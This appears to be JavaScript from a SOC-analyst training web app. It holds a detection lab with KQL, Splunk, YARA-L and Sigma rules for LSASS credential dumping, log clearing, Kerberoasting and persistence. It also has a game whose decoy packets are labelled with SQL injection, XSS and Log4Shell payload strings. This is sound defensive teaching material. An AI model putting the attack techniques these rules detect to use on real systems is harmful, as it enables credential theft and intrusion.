  $("#quests").innerHTML=q.map(([t,ok,h])=>`<div class="quest ${ok?'done':''}"><span class="ok">${ok?"":""}</span><span class="t">${esc(t)}</span>${ok?"":`<a class="u18 btn sm" href="${h}">go</a>`}</div>`).join("");
  $("#questHint").textContent=done===q.length?"all done! ":`${done}/${q.length}`;
  const L=level(); $("#lvlNav").textContent="LV"+(L.i+1);
  BADGES.forEach(([e,n,,f])=>{ if(f()&&!earned.has(n)){ earned.add(n); store.set("badges",[...earned]); toast(`Badge unlocked: ${e} ${n}`); } });
  if($("#v-me").classList.contains("on")) renderMe();
}
function renderMe(){
  const L=level(), p=P();
  $("#lvlEmoji").textContent=L.cur[1]; $("#lvlTitle").textContent=`Level ${L.i+1} · ${L.cur[2]}`;
  $("#lvlXp").textContent=L.next?`${L.x} XP · ${L.next[0]-L.x} to ${L.next[2]}`:`${L.x} XP · max level. Touch grass.`;
  $("#lvlBar").style.width=(L.next?((L.x-L.cur[0])/(L.next[0]-L.cur[0])*100):100)+"%";
  const all=moods(); const days=lastDays(7);
  $("#week").innerHTML=days.map(d=>{ const m=all[dk(d)]; return `<div>${m===undefined?"·":MOODS[m][0]}<small>${d.toLocaleDateString(undefined,{weekday:"short"})}</small></div>`; }).join("");
  const rough=days.slice(-3).filter(d=>(all[dk(d)]??-1)>=3).length;
  $("#weekNote").textContent=rough>=3?"Three rough days in a row. That's a pattern worth noticing. Talk to your lead or someone you trust, and protect your breaks. If it feels like more than work stress, reaching out to a professional is a strong move, not a weak one. ":
    rough>=1?"A rough day here and there is normal in a SOC. Be kind to yourself.":"Check in each shift to see your week.";
  $("#profSum").innerHTML=`${BUD().e} Buddy: <b>${esc(BUD().n)}</b><br>${p.name?esc(p.name):"<span class='small'>no nickname</span>"} · ${esc(p.role)}<br>SIEM: ${esc(p.siem)}<br>Stack: ${p.stack.length?p.stack.map(esc).join(", "):"<span class='small'>none picked</span>"}<br>Humour: ${p.humor==="gentle"?"gentle":"spicy"}`;
  $("#badges").innerHTML=BADGES.map(([e,n,d])=>`<div class="bdg ${earned.has(n)?'':'locked'}"><div class="e">${e}</div><b>${esc(n)}</b><div class="small">${esc(d)}</div></div>`).join("");
  $("#bdgCount").textContent=`${earned.size}/${BADGES.length}`;
  const pool=FP_DATA.trending.map(c=>[c,false]).concat(FP_DATA.hof.map(c=>[c,true])).filter(([c])=>watch.includes(c.id));
  const seen=new Set(); $("#watch").innerHTML=pool.filter(([c])=>!seen.has(c.id)&&seen.add(c.id)).map(([c,o])=>menuCard(c,o)).join("")||'<div class="small">Nothing yet. Tap on any CVE Menu card.</div>';
}
$("#watch").onclick=starClick;

/* data export / import */
function allData(){ const o={}; try{ for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); if(k.startsWith("fpc_")) o[k]=localStorage.getItem(k); } }catch(e){} return o; }
$("#expBtn").onclick=()=>copyText(JSON.stringify(allData()));
$("#impBtn").onclick=()=>{ const box=$("#impBox"); if(box.hidden){ box.hidden=false; box.focus(); return; }
  try{ const o=JSON.parse(box.value); let n=0; Object.entries(o).forEach(([k,v])=>{ if(/^fpc_[a-zA-Z0-9_-]{1,40}$/.test(k)&&typeof v==="string"&&v.length<200000){ localStorage.setItem(k,v); n++; } });
    toast(`Imported ${n} items. Reloading…`); setTimeout(()=>location.reload(),900); }catch(e){ toast("That doesn't look like FP Café data."); } };
let wipeArm=false;
$("#wipeBtn").onclick=()=>{ if(!wipeArm){ wipeArm=true; $("#wipeBtn").textContent="click again to erase"; setTimeout(()=>{wipeArm=false;$("#wipeBtn").textContent="erase everything";},4000); return; }
  try{ Object.keys(allData()).forEach(k=>localStorage.removeItem(k)); }catch(e){} toast("Erased. Fresh start…"); setTimeout(()=>location.reload(),900); };

/* ======================= DETECTION LAB =======================
   § is replaced with a backtick (YARA-L regex literals use backticks).
   All queries are starting points: tune field names to your parsers. */
const Q = s => s.replace(/§/g, "`");
const DETECTIONS = [
 {id:"office-child", t:"Office app spawning a script engine", tech:"T1566.001 / T1059", tactic:"Execution", sev:"high",
  why:"Word, Excel or Outlook launching PowerShell, cmd, mshta or rundll32 is the classic sign of a malicious document or attachment.",
  data:"Process creation with parent process: Sysmon EID 1, Defender DeviceProcessEvents, or Windows 4688 with command-line auditing.",
  fp:["Office add-ins or macros used by finance/reporting teams","IT automation launched from Excel workbooks"],
  triage:["Open the parent document: where did it come from (email, download, share)?","Decode any -enc PowerShell and read what it does","Check network connections from the child process in the next 5 minutes","Search for the same file hash or sender across the org"],
  respond:["Isolate the host if the child process made outbound connections","Purge the email from all mailboxes","Reset the user's password if credentials may be exposed"],
  tune:"Allow-list known add-in paths and signed internal tools by hash, not by name.",
  kql:Q(String.raw`DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe","outlook.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`),
  spl:Q(String.raw`index=sysmon EventCode=1
  (ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe" OR ParentImage="*\\powerpnt.exe" OR ParentImage="*\\outlook.exe")
  (Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\cmd.exe" OR Image="*\\mshta.exe" OR Image="*\\wscript.exe" OR Image="*\\rundll32.exe")
| table _time host User ParentImage Image CommandLine`),
  yaral:Q(String.raw`rule fpcafe_office_spawns_script_engine {
  meta:
    author = "FP Cafe"
    description = "Office application launching a script engine or LOLBin"
    mitre_attack_technique = "T1059"
    severity = "High"
  events:
    $e.metadata.event_type = "PROCESS_LAUNCH"
    re.regex($e.principal.process.file.full_path, §(?i)\\(winword|excel|powerpnt|outlook)\.exe$§)
    re.regex($e.target.process.file.full_path, §(?i)\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32)\.exe$§)
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Office Application Spawning Script Engine
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\winword.exe'
      - '\excel.exe'
      - '\powerpnt.exe'
      - '\outlook.exe'
  selection_child:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Legitimate macros and add-ins
level: high
tags:
  - attack.execution
  - attack.t1059`)},

 {id:"log-cleared", t:"Security audit log cleared", tech:"T1070.001", tactic:"Defense Evasion", sev:"high",
  why:"Event 1102 means someone wiped the Security log. Admins almost never need to in production; attackers do it to hide their tracks.",
  data:"Windows Security log (event 1102) forwarded to your SIEM.",
  fp:["Planned log maintenance on lab or test machines","Re-imaging workflows"],
  triage:["Who cleared it, and is that account normally used interactively?","What happened on this host in the hour before the clear? (check other log sources: EDR, network)","Was the same account used on other hosts around the same time?"],
  respond:["Treat as likely compromise until explained","Preserve EDR telemetry and memory if possible","Disable or reset the account involved pending investigation"],
  tune:"Exclude known lab hosts by asset tag, never by account name alone.",
  kql:Q(String.raw`SecurityEvent
| where EventID == 1102
| project TimeGenerated, Computer, Account, Activity`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:Security" EventCode=1102
| table _time host user`),
  yaral:Q(String.raw`rule fpcafe_security_log_cleared {
  meta:
    author = "FP Cafe"
    description = "Windows Security audit log cleared (event 1102)"
    mitre_attack_technique = "T1070.001"
    severity = "High"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "1102"
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Security Event Log Cleared
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 1102
  condition: selection
falsepositives:
  - Planned maintenance on non-production hosts
level: high
tags:
  - attack.defense-evasion
  - attack.t1070.001`)},

 {id:"lsass-access", t:"Process accessing LSASS memory", tech:"T1003.001", tactic:"Credential Access", sev:"high",
  why:"Reading LSASS memory is how tools like Mimikatz or procdump steal passwords and hashes.",
  data:"Process access telemetry: Sysmon EID 10 (with LSASS in the config) or Defender DeviceEvents.",
  fp:["EDR/AV agents and backup software","Some monitoring tools and crash handlers"],
  triage:["Which process opened LSASS, and is it signed?","Was a .dmp file written soon after? (Sysmon EID 11)","Which accounts were logged on to that host recently? Assume their credentials are exposed"],
  respond:["Isolate the host","Reset passwords for accounts that had sessions on the host, privileged ones first","Hunt for the same tool hash across the fleet"],
  tune:"Allow-list security tools by full path and signer. Watch GrantedAccess values such as 0x1010 and 0x1410.",
  kql:Q(String.raw`DeviceEvents
| where ActionType == "OpenProcessApiCall" and FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsMpEng.exe","MsSense.exe","svchost.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine`),
  spl:Q(String.raw`index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
  NOT (SourceImage="*\\MsMpEng.exe" OR SourceImage="*\\svchost.exe")
| stats count by host SourceImage GrantedAccess`),
  yaral:Q(String.raw`rule fpcafe_lsass_access {
  meta:
    author = "FP Cafe"
    description = "Non-allow-listed process opening LSASS"
    mitre_attack_technique = "T1003.001"
    severity = "High"
  events:
    $e.metadata.event_type = "PROCESS_OPEN"
    re.regex($e.target.process.file.full_path, §(?i)\\lsass\.exe$§)
    not re.regex($e.principal.process.file.full_path, §(?i)\\(MsMpEng|MsSense|svchost)\.exe$§)
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Suspicious LSASS Process Access
status: experimental
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
  filter_security_tools:
    SourceImage|endswith:
      - '\MsMpEng.exe'
      - '\MsSense.exe'
      - '\svchost.exe'
  condition: selection and not filter_security_tools
falsepositives:
  - Security and backup software
level: high
tags:
  - attack.credential-access
  - attack.t1003.001`)},

 {id:"sched-task", t:"New scheduled task created", tech:"T1053.005", tactic:"Persistence", sev:"medium",
  why:"Scheduled tasks are a favourite way to survive reboots. Most environments have a small, known set; the rest deserve a look.",
  data:"Windows Security event 4698 (needs 'Audit Other Object Access Events') or EDR task telemetry.",
  fp:["Software installers and updaters","Group Policy and IT management tools"],
  triage:["What does the task run, and from which folder? (Users, ProgramData or Temp = suspicious)","Who created it, and from which process?","How often does it run? Every few minutes is suspicious"],
  respond:["Disable the task and collect its binary","Hunt for the same task name or action path elsewhere"],
  tune:"Baseline task names for a week, then alert on new names or actions in user-writable paths.",
  kql:Q(String.raw`SecurityEvent
| where EventID == 4698
| parse EventData with * 'TaskName">' TaskName "<" *
| project TimeGenerated, Computer, Account, TaskName`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:Security" EventCode=4698
| table _time host user Task_Name`),
  yaral:Q(String.raw`rule fpcafe_scheduled_task_created {
  meta:
    author = "FP Cafe"
    description = "Scheduled task created (event 4698)"
    mitre_attack_technique = "T1053.005"
    severity = "Medium"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "4698"
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Scheduled Task Created
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4698
  condition: selection
falsepositives:
  - Software updaters and IT management tools
level: medium
tags:
  - attack.persistence
  - attack.t1053.005`)},

 {id:"svc-userpath", t:"Service installed from a user-writable folder", tech:"T1543.003", tactic:"Persistence", sev:"high",
  why:"Real services rarely live in Users, ProgramData or Temp. Attackers give them boring names like 'UpdateSvc'.",
  data:"Windows System log event 7045 (service installed).",
  fp:["Some poorly packaged vendor software","Developer machines"],
  triage:["Check the service binary path, signer and hash","Was it installed remotely? (look for a matching network logon, 4624 type 3, just before)","Does the same service name exist on other hosts?"],
  respond:["Stop and disable the service, collect the binary","If installed remotely, treat the source host as compromised too"],
  tune:"Allow-list signed vendor binaries by hash; keep path-based alerting for everything else.",
  kql:Q(String.raw`Event
| where EventLog == "System" and EventID == 7045
| where RenderedDescription has_any (@"\Users\", @"\ProgramData\", @"\Temp\")
| project TimeGenerated, Computer, RenderedDescription`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:System" EventCode=7045
  (Service_File_Name="*\\Users\\*" OR Service_File_Name="*\\ProgramData\\*" OR Service_File_Name="*\\Temp\\*")
| table _time host Service_Name Service_File_Name`),
  yaral:Q(String.raw`rule fpcafe_service_from_user_writable_path {
  meta:
    author = "FP Cafe"
    description = "Service installed (7045) with an image path in a user-writable folder"
    mitre_attack_technique = "T1543.003"
    severity = "High"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "7045"
    // field holding the service image path depends on your parser; check UDM in your tenant
    re.regex($e.target.process.file.full_path, §(?i)\\(users|programdata|temp)\\§)
  condition:
    $e
}`),
  sigma:Q(String.raw`title: Service Installed From User-Writable Folder
status: experimental
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ImagePath|contains:
      - '\Users\'
      - '\ProgramData\'
      - '\Temp\'
  condition: selection
falsepositives:
  - Poorly packaged vendor software
level: high
tags:
  - attack.persistence
  - attack.t1543.003`)},

 {id:"kerberoast", t:"Possible Kerberoasting (many RC4 service tickets)", tech:"T1558.003", tactic:"Credential Access", sev:"medium",
  why:"Attackers request service tickets for accounts with SPNs, then crack them offline. A burst of RC4 (0x17) tickets from one user is the giveaway.",
  data:"Domain controller Security event 4769 (Kerberos service ticket requested).",
  fp:["Legacy applications that still use RC4","Vulnerability scanners and some monitoring tools"],
  triage:["Which account requested the tickets, and from which host?","How many different services in how short a time?","Are any targeted service accounts privileged or using weak passwords?"],
  respond:["Reset passwords of targeted service accounts to long random values (25+ chars)","Investigate the requesting host for compromise","Move service accounts to gMSAs and disable RC4 where possible"],
  tune:"Exclude known legacy apps by service name; alert when one account hits several services within an hour.",
  kql:Q(String.raw`SecurityEvent
| where EventID == 4769
| parse EventData with * 'ServiceName">' ServiceName "<" * 'TicketEncryptionType">' TicketEncryptionType "<" *
| where TicketEncryptionType == "0x17" and ServiceName !endswith "$" and ServiceName != "krbtgt"
| summarize Services = dcount(ServiceName) by Account, bin(TimeGenerated, 1h)
| where Services > 3`),
  spl:Q(String.raw`index=wineventlog source="WinEventLog:Security" EventCode=4769 Ticket_Encryption_Type=0x17
  Service_Name!="*$" Service_Name!="krbtgt"
| bin _time span=1h
| stats dc(Service_Name) as services values(Service_Name) as targets by _time Account_Name Client_Address
| where services > 3`),
  yaral:Q(String.raw`rule fpcafe_kerberoasting_rc4_burst {
  meta:
    author = "FP Cafe"
    description = "One account requesting many RC4 service tickets within an hour"
    mitre_attack_technique = "T1558.003"
    severity = "Medium"
  events:
    $e.metadata.vendor_name = "Microsoft"
    $e.metadata.product_event_type = "4769"
    // where TicketEncryptionType lands depends on your parser; check UDM in your tenant
    $e.additional.fields["TicketEncryptionType"] = "0x17"
    $e.principal.user.userid = $user
  match:
    $user over 1h
  condition:
    #e > 3
}`),
  sigma:Q(String.raw`title: Kerberos Service Ticket Requested With RC4
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_machine_accounts:
    ServiceName|endswith: '$'
  filter_krbtgt:
    ServiceName: 'krbtgt'
  condition: selection and not 1 of filter_*
falsepositives:
  - Legacy applications using RC4
level: medium
tags:
  - attack.credential-access
  - attack.t1558.003`)}
];
const DET_TABS=[["kql","KQL · Defender/Sentinel"],["spl","SPL · Splunk"],["yaral","YARA-L · Google SecOps"],["sigma","Sigma · any SIEM"]];
function defaultTab(){ const s=P().siem; return s==="Splunk"?"spl":s==="Google SecOps"?"yaral":s==="Other"||s==="Elastic"||s==="QRadar"?"sigma":"kql"; }
const detTab={};
function sevPillD(s){ return s==="high"?'<span class="pill p-crit">HIGH</span>':s==="medium"?'<span class="pill p-high">MEDIUM</span>':'<span class="pill p-unk">LOW</span>'; }
function detBody(d){
  const tab=detTab[d.id]||defaultTab();
  return `<div class="u19 small">${esc(d.why)}</div>
  <div class="u13 lbl">data you need</div><div class="u12">${esc(d.data)}</div>
  <div class="u20 tablike">${DET_TABS.map(([k,l])=>`<button data-dtab="${k}" data-det="${esc(d.id)}" class="${k===tab?'on':''}">${l}</button>`).join("")}</div>
  <div class="codebox">${esc(d[tab])}</div>
  <div class="u21"><button class="btn sm" data-dcopy="${esc(d.id)}">copy ${esc((DET_TABS.find(x=>x[0]===tab)||[])[1]||"")}</button>
    <span class="small">Starting point: field names vary by parser and data source. Test on last week's data first.</span></div>
  <div class="u22 g2 detgrid">
    <div><div class="lbl">triage steps</div><ol class="tight">${d.triage.map(x=>`<li>${esc(x)}</li>`).join("")}</ol>
      <div class="u13 lbl">if it's real</div><ul class="tight">${d.respond.map(x=>`<li>${esc(x)}</li>`).join("")}</ul></div>
    <div><div class="lbl">common false positives</div><ul class="tight">${d.fp.map(x=>`<li>${esc(x)}</li>`).join("")}</ul>
      <div class="u13 lbl">tuning tip</div><div class="u23">${esc(d.tune)}</div></div>
  </div>`;
}
function detCard(d,open){
  return `<div class="det ${open?'open':''}" id="det-${esc(d.id)}"><button class="dethead" data-dopen="${esc(d.id)}">
    <span class="u11">${esc(d.t)}</span><span class="spacer"></span>${sevPillD(d.sev)}<span class="pill p-lav">${esc(d.tactic)}</span><span class="pill p-unk">${esc(d.tech)}</span><span class="chev">${open?"▾":"▸"}</span></button>
    <div class="detbody">${open?detBody(d):""}</div></div>`;
}
let detOpen=new Set(), dlTactic="all";
function renderDetLab(){
  const tactics=["all",...new Set(DETECTIONS.map(d=>d.tactic))];
  $("#dlf").innerHTML=tactics.map(t=>`<button class="${t===dlTactic?'on':''}" data-tac="${esc(t)}">${t==="all"?"all tactics":esc(t)}</button>`).join("");
  const q=$("#dlq").value.trim().toLowerCase();
  const list=DETECTIONS.filter(d=>(dlTactic==="all"||d.tactic===dlTactic)&&(!q||[d.t,d.tech,d.tactic,d.why].join(" ").toLowerCase().includes(q)));
  $("#dlList").innerHTML=list.map(d=>detCard(d,detOpen.has(d.id))).join("")||'<div class="small">No detections match.</div>';
}
const DET=pick(DETECTIONS,dayNum());
function renderDet(){ $("#detBrew").innerHTML=`<div class="u21"><b class="u24">${esc(DET.t)}</b>${sevPillD(DET.sev)}<span class="pill p-unk">${esc(DET.tech)}</span></div>${detBody(DET)}
  <a class="u25 btn sm" href="#detect">open the Detection Lab →</a>`; }
function detClicks(e){
  const t=e.target.closest("[data-dtab]"); if(t){ detTab[t.dataset.det]=t.dataset.dtab; renderDet(); renderDetLab(); return; }
  const c=e.target.closest("[data-dcopy]"); if(c){ const d=DETECTIONS.find(x=>x.id===c.dataset.dcopy); if(d) copyText(d[detTab[d.id]||defaultTab()]); return; }
  const o=e.target.closest("[data-dopen]"); if(o){ const id=o.dataset.dopen; detOpen.has(id)?detOpen.delete(id):detOpen.add(id); renderDetLab(); }
}
$("#detBrew").onclick=detClicks; $("#dlList").onclick=detClicks;
$("#dlf").onclick=e=>{ const b=e.target.closest("[data-tac]"); if(!b) return; dlTactic=b.dataset.tac; renderDetLab(); };
$("#dlq").oninput=renderDetLab;

/* ======================= ARCADE + TEAM ARENA =======================
   Every game is driven by a seeded RNG, so the same challenge code gives
   every teammate exactly the same round. No server, no accounts. */
function mulberry32(a){ return function(){ a|=0; a=a+0x6D2B79F5|0; let t=Math.imul(a^a>>>15,1|a); t=t+Math.imul(t^t>>>7,61|t)^t; return ((t^t>>>14)>>>0)/4294967296; }; }
function seedFrom(str){ let h=2166136261; for(const ch of str){ h^=ch.charCodeAt(0); h=Math.imul(h,16777619); } return h>>>0; }
function shuffleR(arr,r){ const a=arr.slice(); for(let i=a.length-1;i>0;i--){ const j=Math.floor(r()*(i+1)); [a[i],a[j]]=[a[j],a[i]]; } return a; }
const ALPH="ABCDEFGHJKMNPQRSTUVWXYZ23456789";
function rndCode(){ const a=new Uint32Array(5); crypto.getRandomValues(a); return Array.from(a,x=>ALPH[x%ALPH.length]).join(""); }
const GAMES={
  PD:{e:"detect",n:"Packet Defender",how:"Packets fly toward your server. Click the malicious ones. Let legit traffic through: blocking the CEO's Teams call costs a life. 60 seconds, 3 lives."},
  TR:{e:"siren",n:"Triage Rush",how:"60 seconds of alerts. For each: close it as a false positive, escalate to L2, or contain now. Streaks multiply your score."},
  KC:{e:"link",n:"Kill Chain",how:"Three attack stories, shuffled. Click the steps in the order the attacker did them. Faster = more points; wrong clicks cost 100."},
  LH:{e:"eye",n:"Log Hunt",how:"Five rounds of process logs. Click every malicious line. Wrong clicks cost points. Each find teaches you why it's bad."}};
function dailyCode(g){ return g+"-D"+(dayNum()+1).toString(36).toUpperCase(); }
const CODE_RE=/^(PD|TR|KC|LH|TD)-[A-Z0-9]{3,8}$/;
let arc={game:"PD",code:dailyCode("PD"),running:null,result:false};

function lbGet(code){ const v=store.get("lb_"+code,[]); return Array.isArray(v)?v.filter(x=>x&&typeof x.n==="string"&&Number.isFinite(x.s)).slice(0,100):[]; }
function lbAdd(code,n,s,me){ let lb=lbGet(code); const i=lb.findIndex(x=>x.n===n);
  if(i>-1){ if(s>lb[i].s) lb[i].s=s; if(me) lb[i].me=true; } else lb.push({n,s,me:!!me});
  lb.sort((a,b)=>b.s-a.s); store.set("lb_"+code,lb.slice(0,100)); }
function myName(){ return (P().name||"anon").replace(/[^A-Za-z0-9 _-]/g,"").slice(0,16)||"anon"; }
function resultCode(score){ return `FPC1.${arc.code}.${myName()}.${score}`; }
const RES_RE=/^FPC1\.((?:PD|TR|KC|LH|TD)-[A-Z0-9]{3,8})\.([A-Za-z0-9 _-]{1,16})\.(\d{1,6})$/;

function renderArcade(){
  $("#gtabs").innerHTML=Object.entries(GAMES).map(([k,g])=>`<button data-g="${k}" class="${k===arc.game?'on':''}">${g.e} ${g.n}</button>`).join("");
  $("#arcCode").textContent=arc.code; $("#arcDaily").classList.toggle("on",arc.code===dailyCode(arc.game));
  $("#arcHow").textContent=GAMES[arc.game].how;
  const lb=lbGet(arc.code);
  $("#lb").innerHTML=lb.length?lb.slice(0,20).map((x,i)=>`<div class="lbrow ${x.me?'me':''}"><span>${["","",""][i]||(i+1)+"."}</span><span class="nm">${esc(x.n)}${x.me?" (you)":""}</span><b>${x.s}</b></div>`).join(""):
    '<div class="small">No scores for this code yet. Play, then paste teammates\' result codes below.</div>';
  $("#lbTitle").textContent=`${GAMES[arc.game].e} ${arc.code}`;
  if(!arc.running&&!arc.result) idleScreen();
}
function idleScreen(){ const g=GAMES[arc.game], best=lbGet(arc.code).find(x=>x.me);
  $("#gameArea").innerHTML=`<div class="idle"><div class="u26">${g.e}</div><h3 class="u27">${g.n}</h3>
    <div class="u28 small">${esc(g.how)}</div>
    <div class="u13 small">Challenge <b class="u29">${esc(arc.code)}</b>${best?` · your best: <b>${best.s}</b>`:""}</div>
    <button class="u30 btn on" id="gPlay">▶ play</button></div>`;
  $("#gPlay").onclick=startGame; }
function stopGame(){ arc.result=false; if(arc.running){ arc.running.stop(); arc.running=null; } }
function startGame(){ stopGame(); const r=mulberry32(seedFrom(arc.code));
  arc.running=({PD:gamePD,TR:gameTR,KC:gameKC,LH:gameLH,TD:gameTD})[arc.game](r,endGame); }
function endGame(score,summary){
  arc.running=null; arc.result=true; score=Math.max(0,Math.round(score)); bump("arcade");
  const prev=(lbGet(arc.code).find(x=>x.me)||{}).s; lbAdd(arc.code,myName(),score,true);
  const rc=resultCode(score);
  $("#gameArea").innerHTML=`<div class="idle"><div class="u31">${score>=(prev||0)?"":""}</div>
    <h3 class="u32">Score: <span class="u33">${score}</span></h3>
    ${prev!==undefined&&score>prev?'<div class="pill p-mint">new personal best!</div>':""}
    <div class="u34 small">${summary}</div>
    <div class="u35 codebox">${esc(rc)}</div>
    <div class="u36"><button class="btn on" id="gShare">copy for team chat</button><button class="btn" id="gAgain">↻ play again</button></div></div>`;
  $("#gShare").onclick=()=>copyText(`FP Café Arena · ${GAMES[arc.game].n}\nChallenge code: ${arc.code}\nMy score: ${score}\nBeat me: Arcade → join code. Then paste my result:\n${rc}`);
  $("#gAgain").onclick=startGame; renderArcade(); }

$("#gtabs").onclick=e=>{ const b=e.target.closest("[data-g]"); if(!b) return; stopGame(); arc.game=b.dataset.g; arc.code=dailyCode(arc.game); renderArcade(); };
$("#arcNew").onclick=()=>{ stopGame(); arc.code=arc.game+"-"+rndCode(); renderArcade(); toast("New team challenge. Share the code so everyone plays the same round."); };
$("#arcDaily").onclick=()=>{ stopGame(); arc.code=dailyCode(arc.game); renderArcade(); };
$("#arcCopy").onclick=()=>copyText(`FP Café Arena: join my ${GAMES[arc.game].n} challenge with code ${arc.code}`);
$("#arcJoin").onclick=()=>{ const v=$("#arcIn").value.trim().toUpperCase(); if(!CODE_RE.test(v)){ toast("That code doesn't look right. Format: PD-7K3M9"); return; }
  stopGame(); arc.game=v.slice(0,2); arc.code=v; $("#arcIn").value=""; renderArcade(); toast(`Joined ${GAMES[arc.game].n} · ${v}`); };
$("#lbAdd").onclick=()=>{ let n=0,bad=0; $("#lbIn").value.split(/\s+/).forEach(line=>{ const m=line.trim().match(RES_RE); if(!line.trim()) return;
    if(m){ lbAdd(m[1],m[2],Math.min(999999,+m[3]),false); n++; if(m[1]!==arc.code){ stopGame(); arc.code=m[1]; arc.game=m[1].slice(0,2); } } else bad++; });
  $("#lbIn").value=""; renderArcade(); toast(n?`Added ${n} result(s)${bad?`, skipped ${bad} invalid`:""}.`:"No valid result codes found."); };

/* ---------- shared helpers ---------- */
function hud(items){ return `<div class="hud">${items.map(([e,id,v])=>`<span>${e} <b id="${id}">${v}</b></span>`).join("")}</div>`; }
function timer(sec,onTick,onDone){ const end=performance.now()+sec*1000; const h=setInterval(()=>{ const left=Math.max(0,(end-performance.now())/1000); onTick(left); if(left<=0){ clearInterval(h); onDone(); } },100); return ()=>clearInterval(h); }

/* ---------- 1. Packet Defender ---------- */
const PD_BAD=["SYN flood","SQLi ' OR 1=1--","C2 beacon","Mimikatz","EternalBlue","<script>alert(1)","Brute force x500","${jndi:ldap://…}","Port scan","DNS tunnel","Ransom note","Cobalt Strike","Pass-the-hash","Exfil 4GB → pastebin"];
const PD_GOOD=["HTTPS 443","DNS query","NTP sync","Windows Update","SSO login","Backup job","CEO's Teams call","SMTP mail","Health check","Printer job ","VPN keepalive","Payroll export"];
function gamePD(r,done){
  const area=$("#gameArea");
  area.innerHTML=hud([["lives","pdL",3],["score","pdS",0],["time","pdT",60]])+`<canvas id="pdc" class="gcanvas"></canvas><div class="u37 small" id="pdMsg">Click the malicious packets!</div>`;
  const c=$("#pdc"), x=c.getContext("2d"); let W=0,H=0;
  function size(){ const b=c.getBoundingClientRect(), d=window.devicePixelRatio||1; W=b.width; H=b.height; c.width=W*d; c.height=H*d; x.setTransform(d,0,0,d,0,0); }
  size();
  const ev=[]; let t=400; for(let i=0;i<160;i++){ t+=Math.max(260,900-i*7)+r()*320; const bad=r()<0.56;
    ev.push({t,lane:Math.floor(r()*5),bad,lab:bad?PD_BAD[Math.floor(r()*PD_BAD.length)]:PD_GOOD[Math.floor(r()*PD_GOOD.length)],sp:0.09+i*0.0011+r()*0.03}); }
  let st=performance.now(), last=st, ei=0, ps=[], lives=3, score=0, raf=0, over=false, caught=0, leaked=0, oops=0, fx=[];
  const msg=m=>{ $("#pdMsg").textContent=m; };
  function frame(now){ if(over) return; const el=now-st, dt=now-last; last=now;
    while(ei<ev.length&&ev[ei].t<=el){ const e=ev[ei++]; ps.push(Object.assign({},e,{x:-120})); }
    x.clearRect(0,0,W,H);
    for(let l=0;l<5;l++){ const y=30+l*((H-40)/5); x.strokeStyle="#16233d"; x.setLineDash([4,8]); x.beginPath(); x.moveTo(0,y+18); x.lineTo(W-70,y+18); x.stroke(); }
    x.setLineDash([]); x.fillStyle="#141B2E"; x.fillRect(W-62,10,52,H-20); for(let k=0;k<8;k++){ const yy=24+k*((H-48)/8); x.fillStyle="#1F2840"; x.fillRect(W-56,yy,40,(H-48)/8-6); x.fillStyle=(Math.floor(now/300)+k)%3?"#5CE1C6":"#F5B841"; x.fillRect(W-50,yy+5,4,4); }
    x.font="600 12px JetBrains, ui-monospace, monospace";
    ps.forEach(p=>{ p.x+=p.sp*dt; const y=30+p.lane*((H-40)/5); const w=x.measureText(p.lab).width+20; p.w=w; p.y=y;
      x.fillStyle="#1B2440"; x.strokeStyle="#33406A"; x.beginPath(); x.roundRect(p.x,y,w,26,13); x.fill(); x.stroke();
      x.fillStyle="#e8ecf7"; x.textAlign="left"; x.fillText(p.lab,p.x+10,y+17); });
    ps=ps.filter(p=>{ if(p.x+p.w<W-62) return true;
      if(p.bad){ lives--; leaked++; msg(`${p.lab} reached the server!`); } else score+=2; return false; });
    fx=fx.filter(f=>{ f.a-=dt/500; x.globalAlpha=Math.max(0,f.a); x.strokeStyle=f.e==="ok"?"#5CE1C6":"#E8505B"; x.lineWidth=2; x.beginPath(); x.arc(f.x,f.y,(1-f.a)*30+4,0,6.283); x.stroke(); x.globalAlpha=1; return f.a>0; });
    $("#pdL").textContent=Math.max(0,lives); $("#pdS").textContent=score; const left=Math.max(0,60-el/1000); $("#pdT").textContent=left.toFixed(0);
    if(lives<=0||left<=0){ finish(); return; }
    raf=requestAnimationFrame(frame); }
  c.addEventListener("click",e=>{ if(over) return; const b=c.getBoundingClientRect(), mx=e.clientX-b.left, my=e.clientY-b.top;
    const i=ps.findIndex(p=>mx>=p.x&&mx<=p.x+p.w&&my>=p.y-4&&my<=p.y+30); if(i<0) return; const p=ps[i]; ps.splice(i,1);
    if(p.bad){ score+=10; caught++; fx.push({x:mx,y:my,e:"ok",a:1}); sfx("pop"); }
